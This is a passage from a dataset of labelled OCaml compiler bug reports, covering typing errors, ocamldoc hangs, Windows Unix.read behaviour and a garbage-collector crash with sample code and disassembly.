the key sets and\r\nthe function would look badly named.\r\n\r\nShould I assert(false) ?\r\nShould I consistently choose v1 (or v2) ?\r\n\r\nThanks a lot,\r\nF.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7342\r\n**Reporter:** @protz\r\n**Assigned to:** @protz\r\n**Status:** resolved (set by @gasche on 2016-12-16T02:49:50Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\r\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\r\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\r\n**Category:** platform support (windows, cross-compilation, etc)\r\n**Monitored by:** dsheets @gasche @hcarty\r\n\r\n## Bug description\r\n\r\nReading Didier and Xavier's excellent \"Unix programming in OCaml\" course, I performed a `Unix.read` on a descriptor, expecting to read 0 when the descriptor had nothing left in it.\r\n\r\nSadly, I was developing on Windows. It turns out that `Unix.read` throws `EPIPE` there instead (see https://github.com/ocsigen/lwt/issues/20 for another project that performed a workaround there).\r\n\r\n## Steps to reproduce\r\n\r\nSee the attached file.\r\n```ocaml\r\n# #use \"Test.ml\";;\r\n- : unit = ()\r\n\r\n# run \"ls\" [||];;\r\nException: Unix.Unix_error (Unix.EPIPE, \"read\", \"\").\r\n```\r\nThe workaround is to remove the \"when false\" clause in Test.ml.\r\n\r\n## Additional information\r\n\r\nI can submit a pull request that wraps otherlibs/win32unix/unix.ml:read with that exact try-catch block, or I can submit a documentation request that documents this caveat. Any preference?\r\n\r\n## File attachments\r\n\r\n- [Test.ml](https://gist.githubusercontent.com/vicuna/c789bb3ba0f381ac7ab9a5f1763b16db/raw/67f185b2f26c042289ade9675f3bb0509362ce44/Test.ml)\r\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7341\n**Reporter:** goswin\n**Status:** resolved (set by @xavierleroy on 2016-11-11T18:59:08Z)\n**Resolution:** won't fix\n**Priority:** normal\n**Severity:** tweak\n**Version:** 4.03.0\n**Target version:** later\n**Category:** otherlibs\n\n## Bug description\n\nThe types defined by the num library can not be compared with Pervasives because the nat modules does not provide a compare function in the custom ops.\r\n\r\nSaddly nat only stores unsigned integers while big_int uses an ocaml structure to store a sign and the nat. Simply adding a compare to nat then results in -1 < -2 since the signs are the same and nat 1 < nat 2.\r\n\r\nI propose changing the type used by Big_int.big_int and Ratio.ratio to be custom blocks themself providing all the necessary custom ops. The nat stubs already provide support for having a nat at an offset in a block of memory so both big_int and ratio could be stored as one single custom block making this actually more efficient.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7338\n**Reporter:** @gasche\n**Status:** confirmed (set by @gasche on 2016-08-30T06:30:10Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** text\n**Version:** undecided\n**Target version:** later\n**Category:** typing\n**Parent of:** #5888 #6173 #7336 #7565 #7574\n**Monitored by:** @Drup @hcarty @dbuenzli\n\n## Bug description\n\nThe ticket #5068 serves as a parent issue for reports of confusing syntax error messages. This ticket can serve as parent issue for reports of confusing typing error messages.\n\n## Additional information\n\nIt may not be obvious for beginners to tell whether an error is a type error or syntax error (syntax errors have \"Syntax error\" in the error message and occur before -dsource output), and some typos at the syntactic level result in typing errors, but experienced users would do the triaging. The reason to separate them is that the ways to fix them, and thus the cost/benefit analysis inherent in any discussion, are very different.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7337\n**Reporter:** furuse\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:26Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** major\n**Version:** 4.03.0\n**Category:** typing\n**Duplicate of:** #5514\n**Monitored by:** @gasche\n\n## Bug description\n\nIn OCaml 4.03.0,   S with module M = N   adds all the components available of N's signature to S. It contradicts what the reference manual says: 6.10.4 of http://caml.inria.fr/pub/docs/manual-ocaml/modtypes.html\n\n## Steps to reproduce\n\nThe following code reproduce the issue:\r\n\r\n--------------\r\n\r\nmodule type S = sig\r\n  module M : sig type t end\r\nend\r\n\r\nmodule N = struct\r\n  type t = int\r\n  type u = float\r\n  let x = 1\r\nend\r\n  \r\nmodule type T = S with module M = N  \r\n\r\n-------------------\r\n\r\nAbove, I thought module type T is equal to\r\n\r\n   sig module M : sig type t = N.t end end \r\n\r\nbut  ocamlc -i  shows that\r\n\r\n   sig module M : sig  type t = int  type u = float  val x : int end  end\n"},{"labels":["bug"],"text":"**Original bug ID:** 7335\n**Reporter:** @hcarty\n**Status:** resolved (set by @xavierleroy on 2017-10-15T14:37:08Z)\n**Resolution:** unable to duplicate\n**Priority:** normal\n**Severity:** minor\n**Platform:** Any 32bit\n**Version:** 4.02.3\n**Category:** misc\n**Related to:** #5920 #5957\n**Monitored by:** @hcarty\n\n## Bug description\n\nInvalid_argument(\"String.create\") is raised during linking if the generated binary is > 16 megabytes.  I ran into this while trying to compile a program which includes approximately 30 megabytes of static data included using ppx_blob.\n\n## Steps to reproduce\n\n1. Create a program which generates a main.o > 16 megabytes\r\n2. Compile and link using a 32bit OCaml and see the raised exception\n\n## Additional information\n\nIn my case I also had to split up the static data into sub-16 megabyte chunks because ppx_blob inlines external file content as a string.\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7332\n**Reporter:** andy\n**Status:** acknowledged (set by @Octachron on 2017-02-23T23:38:50Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** minor\n**Platform:** x64\n**OS:** Linux Mint\n**OS Version:** 17.3\n**Version:** 4.03.0\n**Target version:** later\n**Category:** ocamldoc\n**Monitored by:** @gasche @Yakobowski\n\n## Bug description\n\nAny use of the `include` construct incurs a warning that the included module was not found.\n\n## Steps to reproduce\n\nmkdir repro && cd repro\r\necho \"include String\" > main.ml\r\nocamldoc -html main.ml\r\n\r\nOutput: \"Warning: Module or module type String not found\"\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7331\n**Reporter:** andy\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-03-08T13:12:46Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Platform:** x64\n**OS:** Linux Mint\n**OS Version:** 17.3\n**Version:** 4.03.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** ocamldoc\n**Monitored by:** @gasche\n\n## Bug description\n\nThe presence of the `module rec M: sig ... end = M` construct causes ocamldoc to hang.\n\n## Steps to reproduce\n\nmkdir repro && cd repro\r\necho \"module rec M: sig end = M\" > main.ml\r\nocamldoc -html main.ml\r\n\r\nIt never finishes.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7330\n**Reporter:** Elarnon\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-08-22T01:03:37Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Monitored by:** @gasche @yallop\n\n## Bug description\n\nWhen compiling non-exhaustive pattern-matching (i.e. without a catch-all clause) on extensible variant types in 4.03.0:\r\n\r\n (a) No warning is emitted at compile time. 4.02.3 properly emits a Warning 8.\r\n\r\n (b) Ill-typed code is executed at runtime. 4.02.3 properly raises a Match_failure exception.\r\n\r\nThis behavior was reproduced using opam's 4.03.0 (i.e. no flambda) version on OSX, Debian testing and Archlinux machines, see attached file for code that compiles without warning in 4.03.0 but segfaults when executed. It is still present in opam's 4.04.0+beta1.\n\n## File attachments\n\n- [crash.ml](https://gist.githubusercontent.com/vicuna/6d43a0dd7587e282bd9f2e20d0693197/raw/2aca2cc8acd374f18371d693483b3b79bcb9cc48/crash.ml)\n"},{"labels":["bug"],"text":"**Original bug ID:** 7329\n**Reporter:** leonidr\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:23Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n-dsource doesn't give correct output for local open modules.\n\n## Steps to reproduce\n\n$ cat source_me.ml\r\nmodule M = struct\r\n  type t = Foo | Bar\r\nend\r\n\r\nlet () =\r\n  let M.(s) = M.(Foo) in\r\n  ()\r\n$ ocamlc -dsource source_me.ml\r\nmodule M = struct type t =\r\n                    | Foo\r\n                    | Bar  end\r\nlet () =\r\n  let (((((((...(((Fatal error: exception Stack overflow\n\n## Additional information\n\n1. This is a 4.04 bug, but that isn't in the dropdown, please reassign when ready.\r\n2. I know that -dsource is undocumented and unsupported, but some tools, such as bisect_ppx, rely upon it for testing.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7328\n**Reporter:** @yallop\n**Assigned to:** @chambart\n**Status:** closed (set by @damiendoligez on 2016-10-26T15:03:00Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0 +dev / +beta1 / +beta2\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** middle end (typedtree to clambda)\n\n## Bug description\n\nExample:\r\n\r\n    $ cat div.ml\r\n    let _ = Int64.div 1L 0L in print_endline \"done\"\r\n\r\nWith flambda:\r\n\r\n    $ opam switch 4.04.0+beta1+flambda\r\n    # To setup the new switch in the current shell, you need to run:\r\n    eval `opam config env`\r\n    $ eval `opam config env`\r\n    $ ocamlopt div.ml && ./a.out\r\n    done\r\n\r\nWithout flambda:\r\n\r\n    $ opam switch 4.04.0+beta1\r\n    # To setup the new switch in the current shell, you need to run:\r\n    eval `opam config env`\r\n    $ eval `opam config env`\r\n    $ ocamlopt div.ml && ./a.out\r\n    Fatal error: exception Division_by_zero\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7327\n**Reporter:** @damiendoligez\n**Status:** resolved (set by @xavierleroy on 2016-12-05T08:59:27Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** runtime system and C interface\n**Monitored by:** @gasche\n\n## Bug description\n\nOn Unix, Makefile.config contains `-Werror` in its BYTECCCOMPOPTS and NATIVECCCOMPOPTS variables. This is equivalent to `-warn-error A` and it's bad.\r\n\r\nSee https://github.com/garrigue/labltk/pull/2 for an example of why it's bad: a new warning in gcc breaks labltk for no good reason.\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7326\n**Reporter:** cspiel\n**Assigned to:** @mshinwell\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:21Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**OS:** GNU/Linux\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** back end (clambda to assembly)\n\n## Bug description\n\nOcamlopt (4.05.0+dev0-2016-08-01) with the Spacetime extension writes\r\na comment to the assembler file in the form\r\n    /* Shape for PARTIALLY_MANGLED_FUNCTION_NAME */\r\nwhere PARTIALLY_MANGLED_FUNCTION_NAME is derived from the function\r\nname.  If the function name happens to contain the end-of-comment\r\ncharacter sequence of the assembler, the assembler barfs.\r\n\r\nFor the example given in `Steps To Reproduce' the offending line is\r\n    /* Shape for camlTimes_slash__*/_4: */\n\n## Steps to reproduce\n\nCompile the following two-liner with a Spacetime-enabled native compiler.\r\n\r\ntype t = {x: float}\r\nlet ( */ ) a v = {x = a *. v.x}\n\n## Additional information\n\nThree possible fixes immediately come into my mind.\r\nThey all concern file \"asmcomp/amd64/emit.mlp\".\r\n\r\n(1) Make the assembler comment in function `emit_spacetime_shapes'\r\n    a literal, e.g.\r\n        D.comment \"Start of Spacetime shapes.\"\r\n    The bracketing end-of-shapes comment already is such a constant.\r\n(2) Consider the attached patch of `emit_spacetime_shapes'.  It applies the\r\n    same mangling to the function name inside the comment as is applied\r\n    to the function's assembler label.\r\n(3) Spice up function `comment' to escape all character sequences that are\r\n    indigestible to the assembler.\n\n## File attachments\n\n- [emit.mlp.diff](https://gist.githubusercontent.com/vicuna/62ee12f2ec4e252c942bd38a823dad38/raw/f901ea7a18a4460a74e4b2d1aee983c25a6d6db6/emit.mlp.diff)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7325\n**Reporter:** @yallop\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-08-22T02:05:49Z)\n**Resolution:** fixed\n**Priority:** high\n**Severity:** major\n**Version:** 4.04.0 +dev / +beta1 / +beta2\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Related to:** #6998\n\n## Bug description\n\nHere's a small test case that is compiled without complaint by 4.03 but fails with the 4.04 beta:\r\n\r\n    $ cat a.ml\r\n    type _ t = T\r\n    $ cat b.ml\r\n    type 'a t = 'a A.t\r\n    $ cat c.ml\r\n    external f : unit -> unit B.t = \"%identity\"\r\n    $ ocamlc -c a.ml b.ml && rm a.cmi && ocamlc -c c.ml\r\n    Fatal error: exception Not_found\r\n\r\nThe bug, which causes the build of the ocaml-memcpy package to fail, was first reported by Gabriel here\r\n\r\n    https://github.com/yallop/ocaml-memcpy/issues/3\r\n\r\nwhere there's also a stack trace.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7324\n**Reporter:** jmcarthur\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-08-16T01:46:22Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Has duplicate:** #7379\n**Monitored by:** @gasche @yallop\n\n## Bug description\n\nOCaml 4.03.0 type checker dies with an assert failure when given the expression I included in the \"Steps To Reproduce\" section of this issue.\n\n## Steps to reproduce\n\nmodule rec T : sig type t = T.t end = T\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7323\n**Reporter:** @bobzhang\n**Assigned to:** @bobzhang\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:25Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Tags:** junior_job\n**Monitored by:** @gasche\n\n## Bug description\n\nIt generates code like this\r\n\r\nlet c = lexbuf.Lexing.lex_buffer.[i] in\r\n\r\nwhere lex_buffer is a buffer, and `.[i]` syntax expect string\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7322\n**Reporter:** junsli\n**Status:** closed (set by @damiendoligez on 2016-09-27T14:26:48Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** documentation\n**Tags:** junior_job\n**Monitored by:** @gasche\n\n## Bug description\n\nCall site of loop' seems incorrect.\r\n\r\nlet f x =\r\n  let rec loop' xs inv_0 inv_1 =\r\n    match xs with\r\n    | [] -> inv_0 + inv_1\r\n    | x::xs -> x + loop2' xs inv_0 inv_1\r\n  and loop2' ys inv_0 inv_1 =\r\n    match ys with\r\n    | [] -> 4\r\n    | y::ys -> y - loop' ys inv_0 inv_1\r\n  in\r\n  Printf.printf \"%d\\n\" (loop' (x + 42) (x + 43) [1; 2; 3])\r\n\r\nIf this phase doesn't change the order of arguments, the call is supposed to be\r\n\r\nloop' [1; 2; 3] (x + 42) (x + 43)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7321\n**Reporter:** @mmottl\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-03-15T02:39:56Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Child of:** #5984\n**Monitored by:** @gasche @mmottl\n\n## Bug description\n\nConsider the following code:\r\n\r\n-----\r\nmodule type S = sig type 'a t end\r\nmodule type Sp = sig type 'a t = private 'a array end\r\n\r\nmodule Id (S : S) = S\r\n\r\nmodule M : Sp = struct\r\n  include Id (struct type 'a t = 'a array end)\r\n\r\n  (**)\r\n\r\n  (* type 'a t = 'a array *)\r\n  (* include (Id (struct type 'a t = 'a array end) : S with type 'a t := 'a t) *)\r\nend  (* M *)\r\n-----\r\n\r\nThe compiler will fail with:\r\n\r\n-----\r\nFile \"./foo.ml\", line 6, characters 16-288:\r\nError: Signature mismatch:\r\n       Modules do not match:\r\n         sig type 'a t = 'a array end\r\n       is not included in\r\n         Sp\r\n       Type declarations do not match:\r\n         type 'a t = 'a array\r\n       is not included in\r\n         type 'a t = private 'a array\r\n       File \"./foo.ml\", line 2, characters 21-49: Expected declaration\r\n       File \"./foo.ml\", line 1, characters 20-29: Actual declaration\r\n       Their variances do not agree.\r\n-----\r\n\r\nThis makes no sense, because the whole point of the signature is to make the type private.  The included functor instantiation essentially does the same thing as establishing the type definition manually, which is just an alias anyway.\r\n\r\nWhen replacing the code in module M with the second section after the comment separator, the problem goes away.  The included functor instantiation doesn't really contain anything in this example then, but I have real world code where some generated functions needed to be included, along with the type, which didn't work.  This signature type substitution trick can be used as a workaround for what seems to be a bug.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7317\n**Reporter:** kosik\n**Status:** resolved (set by @damiendoligez on 2016-11-08T10:43:41Z)\n**Resolution:** won't fix\n**Priority:** low\n**Severity:** tweak\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n\n## Bug description\n\nIn the shell, when I type:\r\n\r\n  echo 'module M1 =\r\n  struct\r\n    type t1 =\r\n      | V0\r\n      | V1\r\n      | V2\r\n      | V3\r\n      | V4\r\n      | V5\r\n      | V6\r\n      | V7\r\n      | V8\r\n      | V9\r\n  end\r\n \r\n  module M2 =\r\n  struct\r\n    type t2 = M1.t1 =\r\n      | V0\r\n      | V1\r\n      | V2\r\n      | V3\r\n      | V4\r\n      | V5\r\n      | V6\r\n      | V7777\r\n      | V8\r\n      | V9\r\n  end;;' | ocaml\r\n\r\nI see this:\r\n\r\n  >   struct\r\n  >     type t1 =                                           # module M1 =\r\n      structV0\r\n        type t1 =\r\n          | V0\r\n          | V1\r\n          | V2\r\n          | V3\r\n          | V4\r\n          | V5\r\n          | V6\r\n          | V7\r\n          | V8\r\n          | V9\r\n      endule M2 =\r\n      struct\r\n      module M2 = M1.t1 =\r\n      structV0\r\n        type t2 = M1.t1 =\r\n          | V0\r\n          | V1\r\n          | V2\r\n          | V3\r\n          | V4\r\n          | V5777\r\n          | V6\r\n          | V7777\r\n          | V8 ocaml\r\n          | V9l version 4.03.0\r\n      end;;\r\n  Error: This variant or record definition does not match that of type M1.t1\r\n         Fields number 8 have different names, V7 and V7777.\r\n  #\r\n\r\nWhich is strange.\r\nIt may be bug in my terminal\r\n(I am able to reproduce this in \"i3\" as well as in \"gnome-terminal\")\r\nor it may be a bug in the Ocaml toplevel itself\r\n(if there is a correctly implemented terminal on which Ocaml toplevel's output looks properly).\r\n\r\nStrange details are:\r\n\r\n  (1)\r\n\r\n    Why only first two lines are marked with \">\" prefix?\r\n\r\n  (2)\r\n\r\n    Why do I see the following lines in the output:\r\n\r\n      structV0\r\n\r\n      | V5777\r\n\r\n      | V8 ocaml\r\n\r\n      | V9l version 4.03.0\r\n\r\n    ?\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7315\n**Reporter:** kosik\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:33:19Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** tweak\n**Version:** 4.03.0\n**Fixed in version:** later\n**Category:** typing\n**Monitored by:** @gasche\n\n## Bug description\n\nAfter typing:\r\n\r\n  type foo = (unit,unit,unit,unit,unit,unit) bar;;\r\n\r\nOcaml (correctly) reports that:\r\n\r\n  Error: Unbound type constructor bar\r\n\r\nWhat I do not understand is why the location information is so vague.\r\nCurrently Ocaml pin-points the problem to:\r\n\r\n  \"(unit,unit,unit,unit,unit,unit) bar\"\r\n\r\nWhy doesn't it provide a more precise location, i.e. where\r\n\r\n  \"bar\"\r\n\r\nidentifier actually occurs?\n\n## Steps to reproduce\n\necho 'type foo = (unit,unit,unit,unit,unit,unit) bar;;' | ocaml\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7314\n**Reporter:** bobot\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2016-08-23T09:00:48Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** block\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Parent of:** #7522\n**Monitored by:** @Drup @gasche @Yakobowski\n\n## Bug description\n\nOn the following code and interface:\r\n\r\n\r\n```\r\nmodule type Comparable = sig\r\n  val id: int\r\nend\r\n\r\nmodule Make_graph (P:sig module Id:Comparable end) = struct\r\n  let foo = P.Id.id\r\nend\r\n\r\nmodule Fold_ordered(P: sig module Id:Comparable end) =\r\nstruct\r\n  include Make_graph(struct module Id = P.Id end)\r\nend\r\n```\r\n\r\n```\r\nmodule type Comparable = sig\r\n  val id: int\r\nend\r\n\r\nmodule Fold_ordered(P: sig module Id:Comparable end): sig\r\n  val foo: int\r\nend\r\n\r\n```\r\n\r\nwith the warning 60 activated and branch 4.04 reports:\r\n```\r\nFile \"test3.ml\", line 9, characters 27-47:\r\nWarning 60: unused module Id.\r\n```\r\n\r\n(line 9 is: `module Fold_ordered(P: sig module Id:Comparable end) =`)\n\n## Steps to reproduce\n\nboot/ocamlrun ./ocamlc -nostdlib -I stdlib -I byterun/ -w +A -o test3.cmi test3.mli\r\nboot/ocamlrun ./ocamlc -nostdlib -I stdlib -I byterun/ -w +A -o test3 test3.ml\n\n## Additional information\n\nThe functors and the interface are needed\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7313\n**Reporter:** bobot\n**Assigned to:** @garrigue\n**Status:** assigned (set by @garrigue on 2016-08-04T21:39:54Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Target version:** later\n**Category:** typing\n**Has duplicate:** #7401\n**Related to:** #3993 #6752 #7152\n**Monitored by:** @gasche @yallop @Yakobowski\n\n## Bug description\n\nThis files with the following signature doesn't compile in 4.4 but compiled before\r\n\r\n```\r\nlet mk_fun () = ref (fun () -> assert false)\r\n\r\n\r\nmodule R = struct\r\n  module B = struct\r\n    type t_ctx = A\r\n    let f = mk_fun ()\r\n  end\r\nend\r\n```\r\n\r\n```\r\nmodule R : sig\r\n  module B : sig\r\n    type t_ctx = A\r\n    val f: (unit -> t_ctx) ref\r\n  end\r\nend\r\n```\r\n\r\nThe deep module and the type `t_ctx` are needed.\r\n\r\nIt is a reduction of a typing error that occurs from compiling Frama-C with 4.04\n\n## Steps to reproduce\n\n```\r\nboot/ocamlrun ./ocamlc -nostdlib -I stdlib -I byterun/ -o test.cmi test.mli\r\nboot/ocamlrun ./ocamlc -nostdlib -I stdlib -I byterun/ -o test test.ml\r\n```\n\n## Additional information\n\nThe error is:\r\n```\r\nFile \"../frama-c/test.ml\", line 1:\r\nError: The implementation ../frama-c/test.ml\r\n       does not match the interface ../frama-c/test.cmi:\r\n       In module R:\r\n       Modules do not match:\r\n         sig module B = R.B end\r\n       is not included in\r\n         sig\r\n           module B : sig type t_ctx = A val f : (unit -> t_ctx) ref end\r\n         end\r\n       In module R.B:\r\n       Modules do not match:\r\n         sig type t_ctx = R.B.t_ctx = A val f : (unit -> '_a) ref end\r\n       is not included in\r\n         sig type t_ctx = A val f : (unit -> t_ctx) ref end\r\n       In module R.B:\r\n       Values do not match:\r\n         val f : (unit -> '_a) ref\r\n       is not included in\r\n         val f : (unit -> t_ctx) ref\r\n       File \"../frama-c/test.ml\", line 9, characters 8-9: Actual declaration\r\n```\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7311\n**Reporter:** @gasche\n**Assigned to:** @damiendoligez\n**Status:** closed (set by @damiendoligez on 2016-11-03T13:25:08Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** text\n**Version:** 4.03.0\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** documentation\n**Related to:** #7007\n\n## Bug description\n\nThe file ocaml_compiler_internal_params introduced by \r\n\r\n  https://github.com/ocaml/ocaml/pull/428\r\n\r\nis undocumented. Not knowing about it can make it difficult for users to properly debug an OCaml environment to understand where some options are coming from.\n\n## Additional information\n\nDocumentation should be added in the chapter \"Batch compilation (ocamlc)\", section \"Options\" (manual/manual/cmds/comp.etex), and also in \"Native-code compilation\" (manual/manual/cmds/native.etex).\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7307\n**Reporter:** @stijn-devriendt\n**Status:** resolved (set by @damiendoligez on 2016-09-02T15:35:03Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Platform:** amd64\n**OS:** Ubuntu\n**OS Version:** 14.04\n**Version:** 4.01.0\n**Fixed in version:** 4.03.0\n**Category:** back end (clambda to assembly)\n**Related to:** #6484 #6486\n\n## Bug description\n\nIn very specific conditions, using the \"%caml_string_get64\" builtin causes crashes in the garbage collector. See the additional information for some deep-dive info of the compiler output, referenced in the explanation below.\r\n\r\nThe break_things method in the referenced program constructs an 8-byte string with a specific value (more on that later), then repeatedly calls %caml_string_get64 on it and stores the result in a list, in order to fill up the minor heap with live data.\r\nAt some point in time, this function will call the garbage collector. Looking at the disassembly, what happens is that the 8-byte load has already been done, leaving the contents in %rsi while calling the GC.\r\nThe GC will then walk the stack in caml_darken_local_roots and find that the frametable expects %rsi to contain a \"value\".\r\n\r\nFollowing that, it will call Oldify on it. Oldify performs some additional checks, most prominently that value must point to the minor heap (which is why we craft the value from the address of the string via address_of, we also subtract 10 (8 to be before the string header and 2 to obtain an unaligned pointer, easily recognisable in gdb - on a target that doesn't support unaligned loads the crashes might even be easier to debug).\r\n\r\nUltimately this crashes the GC. In my runs of the attached progrem it crashes in caml_oldify_one when allocating through caml_alloc_shr with \"Fatal Error: out of memory\" (due to being called during minor heap collection).\r\n\r\nIn our real-world case, we use \"%caml_string_get64\" to deserialize network and file data. This crashed in 2 locations:\r\n- with debug run-time we have sporadic crashes in caml_darken where it checks that the block color is not blue (this entirely depends on the data of the value and whatever it points to). A good extra assert in that function would be:\r\nAssert((v & 1) || ((v & (sizeof(intnat)-1)) == 0)). In fact, this assert could be useful in more places.\r\n- in normal builds we've typically seen crashes in mark_slice, most likely when it has already promoted the incorrect value to the major heap.\r\n\r\nMost of our runs take a while to crash, presumably because the ever-incrementing 64-bit number needs to fall within the minor heap address range.\n\n## Steps to reproduce\n\nocamlopt -o test test.ml\r\n./test\r\n\r\nOptionally, place a breakpoint inside caml_oldify_local_roots (or caml_do_roots) where iterating the live_ofs while tracking the retaddr for the proper call and *root for the tainted value.\n\n## Additional information\n\nSample code: (test.ml)\r\nexternal set64: string -> int -> int64 -> unit = \"%caml_string_set64\"\r\nexternal get64: string -> int -> int64 = \"%caml_string_get64\"\r\n\r\nlet address_of (x:'a) : int64 =\r\n  if Obj.is_block (Obj.repr x) then\r\n    Int64.shift_left (Int64.of_int (Obj.magic x)) 1\r\n  else\r\n    invalid_arg \"Can only find address of boxed values\"\r\n\r\nlet rec break_things str lst =\r\n  let newval = get64 str 0 in\r\n  break_things str (newval :: lst)\r\n\r\nlet () =\r\n  let str = String.create 8 in\r\n  let address = address_of str in\r\n  let () = Printf.printf \"Address = 0x%08LX\" address in\r\n  let () = set64 str 0 (Int64.sub address 10L) in\r\n  break_things str []\r\n\r\n\r\nRelevant disassembly:\r\n0000000000403460 <camlTest__break_things_1012>:\r\n  403460:       55                      push   rbp\r\n  403461:       48 89 e5                mov    rbp,rsp\r\n  403464:       48 83 ec 00             sub    rsp,0x0\r\n  403468:       48 89 c7                mov    rdi,rax\r\n  40346b:       48 c7 c0 07 00 00 00    mov    rax,0x7\r\n  403472:       48 83 c0 00             add    rax,0x0\r\n  403476:       48 8b 77 f8             mov    rsi,QWORD PTR [rdi-0x8]\r\n  40347a:       48 c1 ee 0a             shr    rsi,0xa\r\n  40347e:       48 8d 34 f5 ff ff ff    lea    rsi,[rsi*8-0x1]\r\n  403485:       ff \r\n  403486:       48 0f b6 14 37          movzx  rdx,BYTE PTR [rdi+rsi*1]\r\n  40348b:       48 29 d6                sub    rsi,rdx\r\n  40348e:       48 39 c6                cmp    rsi,rax\r\n  403491:       76 4f                   jbe    4034e2 <camlTest__break_things_1012+0x82>\r\n  403493:       48 8b 37                mov    rsi,QWORD PTR [rdi]  ##### << Load from caml_string_get64\r\n  403496:       49 83 ef 30             sub    r15,0x30\r\n  40349a:       48 8d 05 b7 30 23 00    lea    rax,[rip+0x2330b7]        # 636558 <caml_young_limit>\r\n  4034a1:       4c 3b 38                cmp    r15,QWORD PTR [rax]\r\n  4034a4:       72 35                   jb     4034db <camlTest__break_things_1012+0x7b> ### <<< call to GC with rsi a plain int64\r\n  4034a6:       49 8d 47 08             lea    rax,[r15+0x8]\r\n  4034aa:       48 c7 40 f8 ff 08 00    mov    QWORD PTR [rax-0x8],0x8ff\r\n  4034b1:       00 \r\n  4034b2:       48 8d 15 27 0b 23 00    lea    rdx,[rip+0x230b27]        # 633fe0 <caml_int64_ops>\r\n  4034b9:       48 89 10                mov    QWORD PTR [rax],rdx\r\n  